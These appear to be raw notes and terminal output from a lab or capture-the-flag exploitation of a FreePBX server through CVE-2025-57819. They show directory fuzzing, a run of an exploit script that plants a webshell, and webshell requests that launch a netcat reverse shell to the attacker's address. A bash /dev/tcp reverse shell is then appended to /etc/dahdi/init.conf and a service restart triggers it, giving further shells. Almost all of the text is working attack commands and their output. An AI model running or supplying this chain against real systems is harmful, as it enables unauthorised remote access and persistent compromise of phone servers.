ffuf -w /usr/share/wordlists/dirb/common.txt -u http:/https://10.129.133.172/FUZZ -fc 404

python3 exploit.py -u https://10.129.133.172/admin/config.php --lhost 10.10.15.149 --lport 4444

                        [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 293ms]
.hta                    [Status: 403, Size: 206, Words: 15, Lines: 9, Duration: 306ms]
.htpasswd               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 306ms]
.htaccess               [Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 306ms]
admin                   [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 306ms]
cgi-bin/                [Status: 403, Size: 210, Words: 15, Lines: 9, Duration: 314ms]
index.php               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 199ms]
robots.txt              [Status: 200, Size: 361, Words: 55, Lines: 12, Duration: 300ms]
ucp                     [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 305ms]


└─$ python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://10.129.133.172     
                         __         ___  ___________                   
         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
         \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
                                  \/          \/     \/                            
          
        watchTowr-vs-FreePBX-CVE-2025-57819.py
        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE

          - Piotr and Sonny of watchTowr

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: https://10.129.133.172/this-is-an-ioc-not-actually-watchTowr-ce38cvspqb.php?cmd=hostname
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table

 python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://10.129.133.250

https://10.129.133.172/this-is-an-ioc-not-actually-watchTowr-ce38cvspqb.php?cmd="while true; do nc ATTACKER-IP PORT -e /bin/bash; sleep 10; done"

https://10.129.133.250/this-is-an-ioc-not-actually-watchTowr-33gfhb8wr8.php?cmd=hostname

curl -G "https://10.129.133.250/this-is-an-ioc-not-actually-watchTowr-33gfhb8wr8.php" --data-urlencode "cmd=while true; do nc 10.10.15.149 1212 -e /bin/bash; sleep 10; done"

echo "bash -c 'bash -i >& /dev/tcp/10.10.15.149/4545 0>&1'" >> /etc/dahdi/init.conf


listening on [any] 1212 ...
connect to [10.10.15.149] from (UNKNOWN) [10.129.133.250] 47030
ls
admin
index.php
restapps
robots.txt
this-is-an-ioc-not-actually-watchTowr-33gfhb8wr8.php
this-is-an-ioc-not-actually-watchTowr-kqa67lxv9r.php
ucp
wcb.php
echo "bash -c 'bash -i >& /dev/tcp/10.10.15.149/4545 0>&1'" >> /etc/dahdi/init.conf
tail -n 1 /etc/dahdi/init.conf
bash -c 'bash -i >& /dev/tcp/10.10.15.149/4545 0>&1'
ls
admin
index.php
restapps
robots.txt
this-is-an-ioc-not-actually-watchTowr-33gfhb8wr8.php
this-is-an-ioc-not-actually-watchTowr-kqa67lxv9r.php
ucp
wcb.php
echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart


nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.10.15.149] from (UNKNOWN) [10.129.133.250] 47592
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:9D:EF:BD | 10.129.133.250            |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+
ls

